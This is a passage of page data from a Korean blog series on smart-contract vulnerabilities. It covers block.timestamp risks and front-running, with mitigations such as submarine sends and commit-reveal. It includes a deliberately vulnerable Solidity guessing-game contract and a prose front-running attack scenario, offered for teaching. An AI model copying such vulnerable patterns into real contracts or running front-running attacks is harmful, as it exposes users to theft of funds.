id=\"ì–´ë–»ê²Œí•˜ë©´-ì˜ˆë°©í• -ìˆ˜-ìˆì„ê¹Œ\" style=\"position:relative;\"><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C%ED%95%98%EB%A9%B4-%EC%98%88%EB%B0%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EC%9D%84%EA%B9%8C\" aria-label=\"ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ?</h2>\n<p>block.timstampëŠ” ë¸”ë¡ìƒì„± ì‹œê°„ì´ í•„ìš”í•  ë•Œë§Œ ì‚¬ìš©í•˜ë©´ ëœë‹¤. randomì´ë‚˜ block.timestampê°€ ë“¤ì–´ê°€ ì¡°ê±´ì— ì˜í•´ì„œ etherê°€ ë˜ëŠ” ë°ì´í„°ê°€ ë³´ë‚´ì ¸ì„œëŠ” ì•ˆëœë‹¤.</p>\n<p>block.timestampì™€ ë§ˆì°¬ê°€ì§€ë¡œ <strong>now</strong>, <strong>block.hash</strong> ì˜ ì‚¬ìš©ë„ ë˜ë„ë¡ í”¼í•˜ëŠ” ê²ƒì´ ì¢‹ë‹¤.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#blocktimestamp%EB%9E%80\">block.timestampë€?</a></li>\n<li><a href=\"#%EC%99%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88%EC%97%90-%EB%93%A4%EC%96%B4%EA%B0%94%EC%9D%84%EA%B9%8C\">ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ?</a></li>\n<li><a href=\"#example-code\">Example code</a></li>\n<li><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C%ED%95%98%EB%A9%B4-%EC%98%88%EB%B0%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EC%9D%84%EA%B9%8C\">ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ?</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 22, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 3) block.timestamp","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/block_timestamp/block_timestamp/"}},"prev":{"id":"b5bcc145-ea08-5f50-b709-61d75f38540e","html":"<h1 id=\"-front-running\" style=\"position:relative;\"><a href=\"#-front-running\" aria-label=\" front running permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ Front Running</h1>\n<h2 id=\"front-runningì´ë€\" style=\"position:relative;\"><a href=\"#front-running%EC%9D%B4%EB%9E%80\" aria-label=\"front runningì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Front Runningì´ë€?</h2>\n<p>transactionì´ í¬í•¨ëœ blockì´ ìƒì„±ë˜ê¸°ê¹Œì§€ ì•½ê°„ì˜ ì‹œê°„ì´ ì†Œìš”ëœë‹¤. ë„¤íŠ¸ì›Œí¬ ì°¸ì—¬ìë“¤(miners &#x26; full nodes)ì€ ì²˜ë¦¬ë˜ê¸° ì „ì˜ transcationì„ ë³¼ ìˆ˜ ìˆë‹¤. ë§Œì•½ ë„¤íŠ¸ì›Œí¬ ì°¸ì—¬ìê°€ ì•…ì˜ì ì¸ ë§ˆìŒì„ í’ˆëŠ”ë‹¤ë©´ ì´í›„ì— ì¼ì–´ë‚  transcationì„ ì•Œ ìˆ˜ ìˆê³  ì´ì— ëŒ€í•œ ì •ë³´ë¥¼ ì•…ì˜ì ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.</p>\n<p>ì¦‰ front runningì€ blockì´ ì±„êµ´ë˜ê¸° ì „ transcationì„ í™•ì¸í•´ ìì‹ ì´ ë” ë†’ì€ ê°’ì˜ gas priceë¥¼ ì§€ë¶ˆí•˜ì—¬ ì´ë“ì„ ì·¨í•˜ëŠ” ê²ƒì´ë‹¤.</p>\n<p>ì˜ˆì‹œë¥¼ ë³¸ë‹¤ë©´ ë” ì´í•´ê°€ ì˜ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">FindThisHash</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> hash <span class=\"token operator\">=</span>\r\n        <span class=\"token number\">0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hash of \"Ethereum\"</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> solution<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>hash <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Incorrect answer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>ì´ ì½”ë“œëŠ” ê°„ë‹¨í•œ ì¶”ì¸¡ ê²Œì„ ì½”ë“œì´ë‹¤.\r\nhash ê°’ì˜ ë³€í™˜ ì „ ë‹¨ì–´ ë§ì¶œì‹œ 10 etherë¥¼ contractì— ìˆëŠ” 10 etherë¥¼ ê°€ì ¸ê°ˆ ìˆ˜ ìˆë‹¤.</p>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>Aê°€ FindThisHash contractë¥¼ 10 etherë¥¼ í¬í•¨í•´ ë°°í¬í•œë‹¤.</li>\n<li>Bê°€ hashì˜ ë³€í™˜ ì „ ë‹¨ì–´ë¥¼ ì°¾ëŠ”ë‹¤.(â€œEthereumâ€)</li>\n<li>BëŠ” ì°¾ì€ ë‹µì„ ë§¤ê°œë³€ìˆ˜ë¡œ í•˜ì—¬ solve functionì„ callí•œë‹¤. Call í• ë•Œ gas price 15 gweië¡œ ì§€ì •í•œë‹¤.</li>\n<li>CëŠ” transcation pool ë³´ê³ ìˆë‹¤ê°€ ëˆ„êµ°ê°€ FindThisHash contractì˜ ë¬¸ì œë¥¼ í’€ì—ˆê³  solve functionì„ ì½œí•œ ê²ƒì„ ë³¼ ìˆ˜ìˆë‹¤.</li>\n<li>CëŠ” ì–»ëŠ” ì •ë³´ë¥¼ í† ëŒ€ë¡œ ê°™ì€ ë‹µì„ ì¨ì„œ transactionì„ ë³´ë‚¸ë‹¤. ì´ë•Œ Bê°€ ë³´ë‚¸ gas priceë³´ë‹¤ ë†’ì€ 100gweië¥¼ ì§€ë¶ˆí•œë‹¤.</li>\n<li>Cì˜ transactionì´ ë¨¼ì € ì±„êµ´ë˜ê³  Cê°€ ë³´ìƒì„ íšë“í•˜ê²Œ ëœë‹¤.</li>\n</ol>\n<p>ìœ„ì— ì‹œë‚˜ë¦¬ì˜¤ì²˜ëŸ¼ transaction dataë¥¼ ë¯¸ë¦¬ ì•Œë©´ ì•…ì˜ì ìœ¼ë¡œ ì´ë“ì„ ì·¨í•  ìˆ˜ ìˆë‹¤.</p>\n<hr>\n<h2 id=\"real-world-example-synthetix\" style=\"position:relative;\"><a href=\"#real-world-example-synthetix\" aria-label=\"real world example synthetix permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Real World Example (Synthetix)</h2>\n<p>SynthetixëŠ” íƒˆì¤‘ì•™í™” ê±°ë˜ì†Œ ì¤‘ í•˜ë‚˜ì´ë‹¤. SynthetixëŠ” ë‹¤ë¥¸ íƒˆì¤‘ì•™í™” ê±°ë˜ì†Œì™€ ë‹¤ë¥´ê²Œ ë…ë“í•œ íŠ¹ì§•ì„ ê°€ì§€ê³  ìˆë‹¤. Order bookì„ í†µí•´ì„œ ê±°ë˜ë˜ëŠ” ê²ƒì´ ì•„ë‹Œ Exchange Ratesì— ì˜ì¡´í•´ì„œ ëª¨ë“  ë§¤ìˆ˜/ë§¤ë„ë¥¼ í†µí•´ ê°€ê²©ì´ ê²°ì •ëœë‹¤.\r\në§Œì•½ traderê°€ Exchange Rateê°€ ì—…ë°ì´íŠ¸ ë˜ê¸° ì „ì— ê³§ ì—…ë°ì´íŠ¸ ë  ê°’ì„ ì•Œ ìˆ˜ ìˆë‹¤ë©´ ì–´ë–»ê²Œ ë ê¹Œ?\r\në°”ë€” Exchange Rateì„ ì•ˆë‹¤ëŠ” ê²ƒì€ ë§¤ìˆ˜ê°€/ë§¤ë„ê°€ë¥¼ ë¯¸ë¦¬ ì•Œ ìˆ˜ ìˆë‹¤ëŠ” ë§ê³¼ ê°™ë‹¤. ë°”ë€” ë§¤ìˆ˜ê°€/ë§¤ë„ê°€ë¥¼ ë¯¸ë¦¬ ì•Œë©´ ìƒìŠ¹í•  í† í°ì„ ë¯¸ë¦¬ ì‚¬ë‘ì–´ ìˆ˜ìµì„ ì‹¤í˜„ í•  ìˆ˜ ìˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ í•˜ë½í•  í† í°ì„ ë¯¸ë¦¬ íŒ”ì•„ ì†í•´ë¥¼ ìµœì†Œí™” í•  ìˆ˜ ìˆê²Œëœë‹¤.</p>\n<p>ìœ„ì—ì„œ ë³´ì•˜ë˜ Example Codeì˜ ì‹œë‚˜ë¦¬ì˜¤ì²˜ëŸ¼ Synthetixì—ì„œë„ ìê¸ˆ íƒˆì·¨ê°€ ì¼ì–´ë‚¬ì—ˆë‹¤. í•œ ì‚¬ìš©ìê°€ Trading botì„ êµ¬ì¶•í•´ Exchange Rateì„ ë¯¸ë¦¬ë³´ê³  ì´ë“ì„ ì·¨í•˜ê³  ìˆì—ˆë‹¤.</p>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<ol>\n<li>submarine send</li>\n</ol>\n<p>submarine sendì„ ì‚¬ìš©í•˜ë©´ ì±„êµ´ì ë˜ëŠ” ë„¤íŠ¸ì›Œí¬ ì°¸ì—¬ìê°€ transactionì„ ë¯¸ë¦¬ ë³¼ ìˆ˜ ì—†ê²Œ ëœë‹¤. ê´€ë ¨ ì—†ëŠ” transactionê³¼ ì„ì—¬ìˆë‹¤ê°€ ë‚˜ì¤‘ì— ìƒí˜¸ì‘ìš© ìˆë˜ smart contract ë‹¤ì‹œ ìƒí˜¸ì‘ìš© í•  ìˆ˜ ìˆê²Œ ëœë‹¤. ì´ëŠ” ì´ë¯¸ ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ front runningí•˜ê¸° ëŠ¦ì€ ìƒí™©ì´ ë¨ìœ¼ë¡œ attackì„ ë°©ì–´í•  ìˆ˜ ìˆë‹¤.</p>\n<p>ê¸°ì¡´ì˜ transactionì€ ë°‘ì— ì‚¬ì§„ì²˜ëŸ¼ userì™€ smart contractì´ ì§ì ‘ ìƒí˜¸ì‘ìš© í•  ìˆ˜  ìˆë‹¤.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABbUlEQVQoz22RTStEURjH7wey8REsZuErEFE2yoZYSLJQWIoyJTsLooYS8tYkQoTUGDNm7ngZb2HmMufeO2fGPfene4aJeOp0/s95zvPrOedvAJiJGHNTYxztbAUpvu/r9Te+zoJ6sCsJtgllq9pn2IV3uhrraaqroSVUS/z0UBeV5/2Bf2udyRdEKow460Ucd1J+2dV3jMt4jMm+Zm42xpkZbGVraV4XPO/j15QVHQCVBqpMmKerNXK2S3R5nNv1NlA5jFQywdxIB5gRouFuoiuLGuA4DqVSiXw+jxBCayklUhYpf/h48X7ymR1sF9ZWI1ytNEDxEiP3+spAa4jsQh+j7SH2tzerEwZhWRau6/54sqroxwj27jDW/RnZkwmckx7wixhB48PRIrm9aZ4OZnHenv81pqq//tB1BMXMNOK4B3k+ROkthafA0AYAsaRJwZEVQ5T6Bfppyjc0lTY5vzC5y16TSKaJJ9KIwjufe78AoAZMVN0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flow_without_submarine\"\n        title=\"flow_without_submarine\"\n        src=\"/static/9c9f8eaa6681dbde810a0dd4bfaf5b17/37523/flow_without_submarine.png\"\n        srcset=\"/static/9c9f8eaa6681dbde810a0dd4bfaf5b17/e9ff0/flow_without_submarine.png 180w,\n/static/9c9f8eaa6681dbde810a0dd4bfaf5b17/f21e7/flow_without_submarine.png 360w,\n/static/9c9f8eaa6681dbde810a0dd4bfaf5b17/37523/flow_without_submarine.png 720w,\n/static/9c9f8eaa6681dbde810a0dd4bfaf5b17/0955e/flow_without_submarine.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\r\nsubmarine sendë¥¼ ì´ìš©í•˜ë©´ commit-reveal schemeì„ í™œìš©í•˜ì—¬ transactionì„ ê°ì¶” ìˆ˜ ìˆë‹¤(ì •ë³´ë¥¼ ê°ì¶”ê¸° ìœ„í•´ private &#x26; public keyë¥¼ ì‚¬ìš©í•œë‹¤).\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACmUlEQVQ4y52Ta0sUYRiG97dE/6H+Q30Jw/oQ1ZcOBGEgGWaBBwQtSnElMQuxBMMKLMwyM7Ckg+fTuu46q7ub7XlWd2d2Z2Z3Zq7Y2QO7qQQ98PIO8zzvfd/PyUaZmaZp3UbhFmIh+uemeLX6k4SSrvAdZra/fximYd2O8A4XX/dydrib6mE7DRPDpDJaBfE/AXOBRUD793GqBzq5OtTHlR679T3tc+dJDeM/AH985NSDVs41t3HmViMnHzbxddtp+XTDOFTlvpT1AruwG+HSyFOq+u9zoqeF+reDZAtkxr9SzrFZ6gpge4kEkWCI2U0nXRNveDL5DqewiRiNIslyKe3iu3IM20HSJUliUxAIB4KEfwfYjcbw+3x4PB6SyeS++HIMG5hIUhKPICAIAj6fj0gkUtHxcstms4TDYevEYjFSslSpsBSoGySTErIsoapq6RQDFUWxwGRZxuv14vVuEwhGSMrFUcqT2/bEKGPDA3wefYmmKiUVObBy5pzlQCtGxkyC4gUzW4q1dTXVcvr4UaqOHeHF4w7LkU6nK2pTXiNFSaOboMfnSDvbUZfrSK03YyiBvMLuhsvMDzUx3V9Pb+tNsrp+4OAWp0A3IJsKojma2QoKREJuxp9fI7V6Lw/4rK0Wbb4fceoRg52NZLI6mUyGeDxuNUcURaLRKKlUCk1TUTNg7C6hrdwmEo4T391jZLAZefYGmCq2lpoLzPRd5337eeyt9SVFuQ663W42Njbw+/2lmuanP0Fm6S7i/Bii6MX1qQ7N1ZlXuD0zSmiym50PHfxa/ZIfF10/cAusWpoGuYIYe2toK3dQF2vA04GpiZjFTXE4XWx5/RWLX6xZ+UYUmyPGYswtrOBcX8Ox9I2FxWUc6y5UVeEPI5SirXE6wasAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flow_with_submarine\"\n        title=\"flow_with_submarine\"\n        src=\"/static/fe9f671a96dfd24022283809e3b232ad/37523/flow_with_submarine.png\"\n        srcset=\"/static/fe9f671a96dfd24022283809e3b232ad/e9ff0/flow_with_submarine.png 180w,\n/static/fe9f671a96dfd24022283809e3b232ad/f21e7/flow_with_submarine.png 360w,\n/static/fe9f671a96dfd24022283809e3b232ad/37523/flow_with_submarine.png 720w,\n/static/fe9f671a96dfd24022283809e3b232ad/c4b7c/flow_with_submarine.png 903w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>smart contract ìì²´ì—ì„œ ë¬¸ì œë³´ë‹¤ ë¸”ë¡ì²´ì¸ì´ ê°€ì§„ íŠ¹ì„±ì„ ì´ìš©í•˜ëŠ” ê³µê²©ì´ë‹¤. ì´ë¥¼ ì¢€ ë” ìì„¸íˆ ì´í•´í•˜ê¸° ìœ„í•´ì„œëŠ” ë¸”ë¡ì²´ì¸ ìì²´ì— ëŒ€í•œ ê³µë¶€ê°€ ë” í•„ìš”í•  ê²ƒì´ë¼ê³  ìƒê°í•œë‹¤. smart contractì™€ ë”ë¶ˆì–´ ë¸”ë¡ì²´ì¸ ì½”ì–´ì—ë„ ìµìˆ™í•´ì ¸ë³´ì!</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://solidity-by-example.org/hacks/front-running/\">https://solidity-by-example.org/hacks/front-running/</a></li>\n<li><span style=\"color:grey\"> <a href=\"https://medium.com/haechi-audit-kr/synthetix-front-running-explained-c0d638982cb1\">https://medium.com/haechi-audit-kr/synthetix-front-running-explained-c0d638982cb1</a> </span></li>\n<li><a href=\"https://libsubmarine.org/\">https://libsubmarine.org/</a></li>\n</ul>\n<hr>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#front-running%EC%9D%B4%EB%9E%80\">Front Runningì´ë€?</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example Code</a></p>\n</li>\n<li>\n<p><a href=\"#real-world-example-synthetix\">Real World Example (Synthetix)</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 27, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 5) Front Running","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/front_running/front_running/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/vulnerability/delegate_call/delegate_call/","nextSlug":"/vulnerability/block_timestamp/block_timestamp/","prevSlug":"/vulnerability/front_running/front_running/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}